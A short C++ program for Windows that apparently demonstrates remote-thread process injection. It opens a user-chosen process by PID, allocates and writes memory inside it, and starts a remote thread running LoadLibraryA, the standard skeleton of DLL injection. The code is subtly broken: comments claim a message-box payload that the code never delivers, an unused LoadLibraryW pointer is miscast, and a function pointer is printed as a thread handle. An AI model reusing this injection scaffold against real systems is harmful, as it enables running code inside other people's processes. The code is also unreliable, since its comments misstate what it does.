#include <iostream>
#include <Windows.h>
#include <stdio.h>

using namespace std;

int main() {
    // Replace with the PID of the target process
    DWORD pid;
    cout << "Enter the PID of the target process: ";
    cin >> pid;
    // Payload to inject (in this case, a message box)
    const char *message = "Message from injected thread!";

    // Step 1: Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) {
        cout << "Failed to open process. Error: " << GetLastError() << endl;
        return 1;
    }

    // Step 2: Allocate memory in the remote process
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, strlen(message) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMemory) {
        cout << "Failed to allocate memory in target process. Error: " << GetLastError() << endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Step 3: Write the payload into the allocated memory
    BOOL writeStatus = WriteProcessMemory(hProcess, remoteMemory, message, strlen(message) + 1, NULL);
    if (!writeStatus) {
        cout << "Failed to write to process memory. Error: " << GetLastError() << endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    PAPCFUNC pLoadLibrary = (PAPCFUNC)GetProcAddress(hKernel32,"LoadLibraryW");
    printf("Thread handle: %lu\n", (uintptr_t)pLoadLibrary);
    // Step 4: Create a remote thread to execute MessageBoxA in the target process
    HANDLE hThread = CreateRemoteThread(
        hProcess,                
        NULL,                    
        0,                       
        (LPTHREAD_START_ROUTINE)LoadLibraryA, 
        remoteMemory,            
        0,                       
        NULL                     
    );
    printf("Thread handle: %lu\n", (uintptr_t)hThread);
    if (!hThread) {
        cout << "Failed to create remote thread. Error: " << GetLastError() << endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    cout << "Successfully injected a thread into PID " << pid << endl;

    // Wait for the thread to complete execution
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup resources
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
